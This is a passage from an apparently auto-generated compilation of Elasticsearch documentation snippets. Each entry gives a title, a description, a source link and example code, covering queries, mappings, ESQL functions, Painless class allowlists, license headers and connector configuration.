6]\n   }\n}\n\nPOST /metrics_index/_search?size=0\n{\n  \"aggs\": {\n    \"avg_latency\":\n      { \"avg\": { \"field\": \"latency_histo\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Describing Cube Root Function Behavior in ESQL\nDESCRIPTION: This snippet provides a description of the cube root function in ESQL. It explains that the function accepts any numeric input and always returns a double value. It also notes that cube roots of infinities return null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/cbrt.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nReturns the cube root of a number. The input can be any numeric value, the return value is always a double. Cube roots of infinities are null.\n```\n\n----------------------------------------\n\nTITLE: Locale Builder Utility in Java\nDESCRIPTION: Provides methods for dynamically constructing and modifying Locale instances with flexible configuration options\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_28\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.Locale$Builder {\n  Locale build()\n  Locale.Builder setLanguage(String)\n  Locale.Builder setRegion(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table for ESQL Function in Markdown\nDESCRIPTION: This markdown table shows the supported input types (string1, string2, delim) and the resulting output type for an ESQL function. It demonstrates that regardless of the input types (keyword or text), the function always returns a keyword type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_zip.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string1 | string2 | delim | result |\n| --- | --- | --- | --- |\n| keyword | keyword | keyword | keyword |\n| keyword | keyword | text | keyword |\n| keyword | keyword | | keyword |\n| keyword | text | keyword | keyword |\n| keyword | text | text | keyword |\n| keyword | text | | keyword |\n| text | keyword | keyword | keyword |\n| text | keyword | text | keyword |\n| text | keyword | | keyword |\n| text | text | keyword | keyword |\n| text | text | text | keyword |\n| text | text | | keyword |\n```\n\n----------------------------------------\n\nTITLE: Reserved Keywords in Painless\nDESCRIPTION: Core language keywords used in Painless scripting. These tokens are reserved for built-in language features and cannot be used as identifiers. Common programming constructs like control flow (if/else), loops (while/for), exception handling (try/catch), and object-oriented features (new/instanceof) are included.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-keywords.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nif\nelse\nwhile\ndo\nfor\nin\ncontinue\nbreak\nreturn\nnew\ntry\ncatch\nthrow\nthis\ninstanceof\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Multi-License Copyright Header\nDESCRIPTION: Standard copyright header specifying that the code is licensed under one of three licenses: Elastic License 2.0, GNU AGPL v3.0, or Server Side Public License v1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/license-headers/sspl+elastic-license-header.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n/*\n * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one\n * or more contributor license agreements. Licensed under the \"Elastic License\n * 2.0\", the \"GNU Affero General Public License v3.0 only\", and the \"Server Side\n * Public License v 1\"; you may not use this file except in compliance with, at\n * your election, the \"Elastic License 2.0\", the \"GNU Affero General Public\n * License v3.0 only\", or the \"Server Side Public License, v 1\".\n */\n```\n\n----------------------------------------\n\nTITLE: Indexing a Pre-indexed Shape in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to index a pre-defined shape in the `shapes` index. It inserts a document with the ID `deu` containing a shape defined as an `envelope`. This shape can then be referenced in other queries using its ID.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT /shapes/_doc/deu\n{\n  \"location\": {\n    \"type\": \"envelope\",\n    \"coordinates\" : [[13.0, 53.0], [14.0, 52.0]]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Text Similarity Processor in Elasticsearch\nDESCRIPTION: Specifies the configuration options for the text similarity processor, including span score combination function and tokenization settings. It supports various tokenization methods and provides options for handling sequences longer than the maximum allowed length.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"text_similarity\": {\n    \"span_score_combination_function\": \"max\",\n    \"tokenization\": {\n      \"bert\": {},\n      \"deberta_v2\": {},\n      \"mpnet\": {},\n      \"roberta\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Fingerprint Processor Result Example\nDESCRIPTION: This snippet shows the output produced by the fingerprint processor after hashing the user data. The processor generates a base64-encoded hash stored in the 'fingerprint' field while preserving the original document data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/fingerprint-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"docs\": [\n    {\n      \"doc\": {\n        ...\n        \"_source\": {\n          \"fingerprint\" : \"WbSUPW4zY1PBPehh2AA/sSxiRjw=\",\n          \"user\" : {\n            \"last_name\" : \"Smith\",\n            \"first_name\" : \"John\",\n            \"date_of_birth\" : \"1980-01-15\",\n            \"is_active\" : true\n          }\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Multiple Tables - JavaScript\nDESCRIPTION: This snippet demonstrates how to construct a JSON configuration for querying multiple tables using the Elastic Search PostgreSQL connector. The configuration includes a list of tables and corresponding SQL queries. No specific PostgreSQL or Elastic dependencies are required beyond standard setups.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"tables\": [\n      \"employee\"\n    ],\n    \"query\": \"SELECT * FROM employee\"\n  },\n  {\n    \"tables\": [\n      \"customer\"\n    ],\n    \"query\": \"SELECT * FROM customer\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Configuring URI Parts Processor in Elasticsearch\nDESCRIPTION: Example configuration for the URI parts processor showing key options like field selection, target field, and retention settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/uri-parts-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"description\" : \"...\",\n  \"processors\" : [\n    {\n      \"uri_parts\": {\n        \"field\": \"input_field\",\n        \"target_field\": \"url\",\n        \"keep_original\": true,\n        \"remove_if_successful\": false\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Example Warning Log Message\nDESCRIPTION: This warning message indicates a failure to parse a file during extraction. `<ERROR MESSAGE>` will provide an explanation, and if unclear, contacting support is recommended. Failed files will be indexed with an empty string in the `body` field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\nExtraction service could not parse <FILENAME>. Status: <RESPONSE STATUS>; <ERROR NAME>: <ERROR MESSAGE>.\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Field Mappings for Terms Set Query\nDESCRIPTION: This snippet shows how to create an index with the necessary field mappings to support a terms set query. It defines fields for the candidate name, programming languages, and a numeric field to specify required matches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-set-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /job-candidates\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\": {\n        \"type\": \"keyword\"\n      },\n      \"programming_languages\": {\n        \"type\": \"keyword\"\n      },\n      \"required_matches\": {\n        \"type\": \"long\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtered T-test Aggregation Query in Elasticsearch\nDESCRIPTION: Shows how to use filters in a t_test aggregation to compare startup times between different groups of nodes, demonstrating an unpaired test scenario.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-ttest-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET node_upgrade/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"startup_time_ttest\": {\n      \"t_test\": {\n        \"a\": {\n          \"field\": \"startup_time_before\",         <1>\n          \"filter\": {\n            \"term\": {\n              \"group\": \"A\"                        <2>\n            }\n          }\n        },\n        \"b\": {\n          \"field\": \"startup_time_before\",         <3>\n          \"filter\": {\n            \"term\": {\n              \"group\": \"B\"                        <4>\n            }\n          }\n        },\n        \"type\": \"heteroscedastic\"                 <5>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Copyright and License Header for Elasticsearch in Java\nDESCRIPTION: This code snippet defines the copyright and license header for Elasticsearch. It specifies that the code is copyrighted by Elasticsearch B.V. and licensed under the Elastic License 2.0. Users are prohibited from using the code except in compliance with this license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/license-headers/elastic-license-2.0-header.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n/*\n * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one\n * or more contributor license agreements. Licensed under the Elastic License\n * 2.0; you may not use this file except in compliance with the Elastic License\n * 2.0.\n */\n```\n\n----------------------------------------\n\nTITLE: Explicit Mapping for Nested Objects in Elasticsearch\nDESCRIPTION: Demonstrates how to define an explicit mapping for a document with nested objects. The mapping specifies field types for each property, including the nested 'manager' and 'manager.name' objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/object.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": { <1>\n      \"region\": {\n        \"type\": \"keyword\"\n      },\n      \"manager\": { <2>\n        \"properties\": {\n          \"age\":  { \"type\": \"integer\" },\n          \"name\": { <3>\n            \"properties\": {\n              \"first\": { \"type\": \"text\" },\n              \"last\":  { \"type\": \"text\" }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoShape as Array (Multipoint)\nDESCRIPTION: This code snippet demonstrates indexing multiple points as a single multipoint `geo_shape`.  Both requests are equivalent, treating the array of points as a single multipoint shape. This shows how Elasticsearch handles arrays of shapes in `geo_shape` fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPUT /test/_doc/1\n{\n  \"location\": [\n    {\n      \"coordinates\": [46.25,20.14],\n      \"type\": \"point\"\n    },\n    {\n      \"coordinates\": [47.49,19.04],\n      \"type\": \"point\"\n    }\n  ]\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT /test/_doc/1\n{\n  \"location\":\n    {\n      \"coordinates\": [[46.25,20.14],[47.49,19.04]],\n      \"type\": \"multipoint\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Random Scores in Elasticsearch Function Score Query\nDESCRIPTION: This snippet shows how to create random scores in a function_score query, allowing for uniformly distributed scores and providing an option to set a seed and field for reproducibility of scores, demonstrating the usage of the random_score function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"random_score\": {\n        \"seed\": 10,\n        \"field\": \"_seq_no\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Runtime Field with Terms Aggregation in Elasticsearch\nDESCRIPTION: This example shows how to query the previously defined 'day_of_week' runtime field using a terms aggregation. The query demonstrates how Elasticsearch evaluates the Painless script at query time to generate dynamic values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-runtime-fields-context.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET seats/_search\n{\n  \"size\": 0,\n  \"fields\": [\n    \"time\",\n    \"day_of_week\"\n    ],\n    \"aggs\": {\n      \"day_of_week\": {\n        \"terms\": {\n          \"field\": \"day_of_week\",\n          \"size\": 10\n        }\n      }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Lowercase Filter for Greek Language in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a custom lowercase filter specifically for the Greek language, using the create index API to define both the filter and a custom analyzer that uses it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lowercase-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT custom_lowercase_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"greek_lowercase_example\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\"greek_lowercase\"]\n        }\n      },\n      \"filter\": {\n        \"greek_lowercase\": {\n          \"type\": \"lowercase\",\n          \"language\": \"greek\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Dependency Transformation Log Output\nDESCRIPTION: Build system output showing the transformation of multiple JAR dependencies through various build phases including InstrumentationAnalysisTransform, MergeInstrumentationAnalysisTransform, and ExternalDependencyInstrumentingArtifactTransform.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nTransforming jackson-annotations-2.15.0.jar (com.fasterxml.jackson.core:jackson-annotations:2.15.0) with ExternalDependencyInstrumentingArtifactTransform\nTransforming apache-rat-0.11.jar (org.apache.rat:apache-rat:0.11) with MergeInstrumentationAnalysisTransform\nTransforming apache-rat-tasks-0.11.jar (org.apache.rat:apache-rat-tasks:0.11) with InstrumentationAnalysisTransform\n```\n\n----------------------------------------\n\nTITLE: Configuring Collect Mode for Terms Aggregation in Elasticsearch\nDESCRIPTION: This example shows how to set the collect mode to 'breadth_first' for a terms aggregation. This mode is useful for fields with high cardinality or when the cardinality is unknown, optimizing performance for certain scenarios.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_15\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"actors\": {\n      \"terms\": {\n        \"field\": \"actors\",\n        \"size\": 10,\n        \"collect_mode\": \"breadth_first\"\n      },\n      \"aggs\": {\n        \"costars\": {\n          \"terms\": {\n            \"field\": \"actors\",\n            \"size\": 5\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Sample\nDESCRIPTION: This snippet shows a sample copyright disclaimer to be signed by an employer or school. It disclaims all copyright interest in the specified program. The sample includes placeholder fields for the organization name, program name, author's name, and signature.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\n\"    Yoyodyne, Inc., hereby disclaims all copyright interest in the\n    program `Gnomovision' (which makes passes at compilers) written by\n    James Hacker.\n\n    signature of Ty Coon, 1 April 1989\n    Ty Coon, President of Vice\"\n```\n\n----------------------------------------\n\nTITLE: Applying Bucket Sort to Date Histogram Aggregation in Elasticsearch\nDESCRIPTION: Shows how to use bucket sort to return the top 3 months with highest total sales in descending order, applied to a date histogram aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-sort-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"total_sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"sales_bucket_sort\": {\n          \"bucket_sort\": {\n            \"sort\": [\n              { \"total_sales\": { \"order\": \"desc\" } }\n            ],\n            \"size\": 3\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Synthetic Source for date_nanos Field in Elasticsearch\nDESCRIPTION: Example of creating an index with synthetic _source enabled and a date_nanos field, demonstrating how values are sorted in the synthetic source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date_nanos.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"date\": { \"type\": \"date_nanos\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"date\": [\"2015-01-01T12:10:30.000Z\", \"2014-01-01T12:10:30.000Z\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Parent Circuit Breaker Settings\nDESCRIPTION: Settings for the parent-level circuit breaker that controls total memory usage across all breakers. Includes real memory usage toggle and total limit configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindices.breaker.total.use_real_memory: true\nindices.breaker.total.limit: \"70%\"\n```\n\n----------------------------------------\n\nTITLE: Running Public Callers Finder Tool\nDESCRIPTION: This shell command is used to execute the Public Callers Finder tool within the Elasticsearch project. It requires an input CSV file formatted with specific columns and an optional boolean parameter to dictate whether the search should continue past the first public method.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/public-callers-finder/README.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew :libs:entitlement:tools:public-callers-finder:run <input-file> [<bubble-up-from-public>]\n```\n\n----------------------------------------\n\nTITLE: Defining DoubleFieldScript Class in Java\nDESCRIPTION: This snippet defines the class `DoubleFieldScript` which is essential for handling double-valued scripts in Elasticsearch. It also sets the script's context and allows for interaction with double values through the Painless scripting engine.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.double_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.DoubleFieldScript @no_import {\n}\nclass org.elasticsearch.script.DoubleFieldScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Sync Rules in Elasticsearch JavaScript\nDESCRIPTION: These JSON rules manage file indexing by ownership and extension criteria in Elasticsearch. They are executed during a full sync, emphasizing prioritizing specific ownerships while handling extensions strategically.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"owners\": [\"user1-domain@onmicrosoft.com\", \"user2-domain@onmicrosoft.com\"]\n  },\n  {\n    \"skipFilesWithExtensions\": [\".py\"]\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: ESQL GROK Pattern Matching for ZIP Codes\nDESCRIPTION: Query that extracts components from ZIP codes using GROK pattern matching. The pattern splits ZIP codes into parts using WORD patterns. Results show successful parsing of Dutch and US formats, with null results for unmatched Japanese formats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/grokWithDuplicateFieldNames.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM addresses\n| KEEP city.name, zip_code\n| GROK zip_code \"\"%{WORD:zip_parts} %{WORD:zip_parts}\"\"\n```\n\n----------------------------------------\n\nTITLE: Unicode Conversion Copyright Notice\nDESCRIPTION: Copyright notice and usage limitations for Unicode conversion code used in UnicodeUtil.java\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-phonetic/licenses/lucene-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright 2001-2004 Unicode, Inc.\n * \n * Disclaimer\n * \n * This source code is provided as is by Unicode, Inc. No claims are\n * made as to fitness for any particular purpose. No warranties of any\n * kind are expressed or implied. The recipient agrees to determine\n * applicability of information provided. If this file has been\n * purchased on magnetic or optical media from Unicode, Inc., the\n * sole remedy for any claim will be exchange of defective media\n * within 90 days of receipt.\n * \n * Limitations on Rights to Redistribute This Code\n * \n * Unicode, Inc. hereby grants the right to freely use the information\n * supplied in this file in the creation of products supporting the\n * Unicode Standard, and to make copies of this file in any form\n * for internal or external distribution as long as this notice\n * remains attached.\n */\n```\n\n----------------------------------------\n\nTITLE: Importing QSTR Function Documentation\nDESCRIPTION: This snippet includes various markdown files that contain different sections of the QSTR function documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/qstr.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/qstr.md\n:::\n\n:::{include} ../description/qstr.md\n:::\n\n:::{include} ../types/qstr.md\n:::\n\n:::{include} ../functionNamedParams/qstr.md\n:::\n\n:::{include} ../examples/qstr.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Downloading Gmail Connector Configuration File\nDESCRIPTION: Shell command to download the sample configuration file for the Gmail connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-gmail.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Network Community ID Methods in Painless\nDESCRIPTION: These method signatures demonstrate how to use the community ID processor to compute the network community ID for network flow data, with and without a custom seed value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_8\n\nLANGUAGE: painless\nCODE:\n```\nString communityId(String sourceIpAddrString, String destIpAddrString, Object ianaNumber, Object transport, Object sourcePort, Object destinationPort, Object icmpType, Object icmpCode, int seed)\nString communityId(String sourceIpAddrString, String destIpAddrString, Object ianaNumber, Object transport, Object sourcePort, Object destinationPort, Object icmpType, Object icmpCode)\n```\n\n----------------------------------------\n\nTITLE: Restricting Default Temp File Creation Methods\nDESCRIPTION: Forbids using temporary file/directory creation methods without explicitly specifying a location.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_3\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Specify a location for the temp file/directory instead.\njava.nio.file.Files#createTempDirectory(java.lang.String,java.nio.file.attribute.FileAttribute[])\njava.nio.file.Files#createTempFile(java.lang.String,java.lang.String,java.nio.file.attribute.FileAttribute[])\n```\n\n----------------------------------------\n\nTITLE: Defining Java Character Class\nDESCRIPTION: This snippet outlines the Character class in Java which wraps the char primitive type. It provides methods for character comparison, validation, and manipulation, as well as constants for various Unicode character properties. Key functionalities include determining character directionality, checking if a character is a digit, and converting characters to lower/upper case.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_6\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Character {\n  int BYTES\n  byte COMBINING_SPACING_MARK\n  byte CONNECTOR_PUNCTUATION\n  byte CONTROL\n  byte CURRENCY_SYMBOL\n  byte DASH_PUNCTUATION\n  byte DECIMAL_DIGIT_NUMBER\n  byte DIRECTIONALITY_ARABIC_NUMBER\n  byte DIRECTIONALITY_BOUNDARY_NEUTRAL\n  byte DIRECTIONALITY_COMMON_NUMBER_SEPARATOR\n  byte DIRECTIONALITY_EUROPEAN_NUMBER\n  byte DIRECTIONALITY_EUROPEAN_NUMBER_SEPARATOR\n  byte DIRECTIONALITY_EUROPEAN_NUMBER_TERMINATOR\n  byte DIRECTIONALITY_LEFT_TO_RIGHT\n  byte DIRECTIONALITY_LEFT_TO_RIGHT_EMBEDDING\n  byte DIRECTIONALITY_LEFT_TO_RIGHT_OVERRIDE\n  byte DIRECTIONALITY_NONSPACING_MARK\n  byte DIRECTIONALITY_OTHER_NEUTRALS\n  byte DIRECTIONALITY_PARAGRAPH_SEPARATOR\n  byte DIRECTIONALITY_POP_DIRECTIONAL_FORMAT\n  byte DIRECTIONALITY_RIGHT_TO_LEFT\n  byte DIRECTIONALITY_RIGHT_TO_LEFT_ARABIC\n  byte DIRECTIONALITY_RIGHT_TO_LEFT_EMBEDDING\n  byte DIRECTIONALITY_RIGHT_TO_LEFT_OVERRIDE\n  byte DIRECTIONALITY_SEGMENT_SEPARATOR\n  byte DIRECTIONALITY_UNDEFINED\n  byte DIRECTIONALITY_WHITESPACE\n  byte ENCLOSING_MARK\n  byte END_PUNCTUATION\n  byte FINAL_QUOTE_PUNCTUATION\n  byte FORMAT\n  byte INITIAL_QUOTE_PUNCTUATION\n  byte LETTER_NUMBER\n  byte LINE_SEPARATOR\n  byte LOWERCASE_LETTER\n  byte MATH_SYMBOL\n  int MAX_CODE_POINT\n  char MAX_HIGH_SURROGATE\n  char MAX_LOW_SURROGATE\n  int MAX_RADIX\n  char MAX_SURROGATE\n  char MAX_VALUE\n  int MIN_CODE_POINT\n  char MIN_HIGH_SURROGATE\n  char MIN_LOW_SURROGATE\n  int MIN_RADIX\n  int MIN_SUPPLEMENTARY_CODE_POINT\n  char MIN_SURROGATE\n  char MIN_VALUE\n  byte MODIFIER_LETTER\n  byte MODIFIER_SYMBOL\n  byte NON_SPACING_MARK\n  byte OTHER_LETTER\n  byte OTHER_NUMBER\n  byte OTHER_PUNCTUATION\n  byte OTHER_SYMBOL\n  byte PARAGRAPH_SEPARATOR\n  byte PRIVATE_USE\n  int SIZE\n  byte SPACE_SEPARATOR\n  byte START_PUNCTUATION\n  byte SURROGATE\n  byte TITLECASE_LETTER\n  byte UNASSIGNED\n  byte UPPERCASE_LETTER\n  int charCount(int)\n  char charValue()\n  int codePointAt(char[],int,int)\n  int codePointAt(CharSequence,int)\n  int codePointBefore(char[],int,int)\n  int codePointBefore(CharSequence,int)\n  int codePointCount(CharSequence,int,int)\n  int compare(char,char)\n  int compareTo(Character)\n  int digit(int,int)\n  char forDigit(int,int)\n  byte getDirectionality(int)\n  String getName(int)\n  int getNumericValue(int)\n  int getType(int)\n  int hashCode(char)\n  char highSurrogate(int)\n  boolean isAlphabetic(int)\n  boolean isBmpCodePoint(int)\n  boolean isDefined(int)\n  boolean isDigit(int)\n  boolean isHighSurrogate(char)\n  boolean isIdentifierIgnorable(int)\n  boolean isIdeographic(int)\n  boolean isISOControl(int)\n  boolean isJavaIdentifierPart(int)\n  boolean isJavaIdentifierStart(int)\n  boolean isLetter(int)\n  boolean isLetterOrDigit(int)\n  boolean isLowerCase(int)\n  boolean isMirrored(int)\n  boolean isSpaceChar(int)\n  boolean isSupplementaryCodePoint(int)\n  boolean isSurrogate(char)\n  boolean isSurrogatePair(char,char)\n  boolean isTitleCase(int)\n  boolean isUnicodeIdentifierPart(int)\n  boolean isUnicodeIdentifierStart(int)\n  boolean isUpperCase(int)\n  boolean isValidCodePoint(int)\n  boolean isWhitespace(int)\n  char lowSurrogate(int)\n  int offsetByCodePoints(char[],int,int,int,int)\n  int offsetByCodePoints(CharSequence,int,int)\n  char reverseBytes(char)\n  char[] toChars(int)\n  int toChars(int,char[],int)\n  int toCodePoint(char,char)\n  char toLowerCase(char)\n  String toString(char)\n  char toTitleCase(char)\n  char toUpperCase(char)\n  Character valueOf(char)\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Node Certificate for Elasticsearch in Bash\nDESCRIPTION: Generates a certificate for the Elasticsearch node communication signed by the CA. Similar to the HTTP certificate, it includes DNS for localhost and IP addresses for both IPv4 and IPv6 loopback interfaces.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/qa/saml-rest-tests/src/javaRestTest/resources/ssl/README.txt#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nelasticsearch-certutil cert --name \"node\" --ca-cert ${PWD}/ca.crt --ca-key ${PWD}/ca.key --days 9999 --dns \"localhost\" --ip \"127.0.0.1\" --ip \"0:0:0:0:0:0:0:1\" --keysize 2048 --out ${PWD}/node.zip --pem \nunzip node.zip\nmv node/node.* ./\nrmdir node\nrm node.zip\n```\n\n----------------------------------------\n\nTITLE: Decoding JWT Token for Elasticsearch Authentication\nDESCRIPTION: This snippet shows a decoded JWT token used for authentication in Elasticsearch. It includes the header with key ID and algorithm, and the payload with issuer, audience, subject, expiration, and issued-at claims.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/authc/apikey/serialized-signed-RS256-jwt.txt#2025-04-21_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"header\": {\n    \"kid\": \"test-rsa-key\",\n    \"alg\": \"RS256\"\n  },\n  \"payload\": {\n    \"iss\": \"https://issuer.example.com/\",\n    \"aud\": \"https://audience.example.com/\",\n    \"sub\": \"user1\",\n    \"exp\": 4070908800,\n    \"iat\": 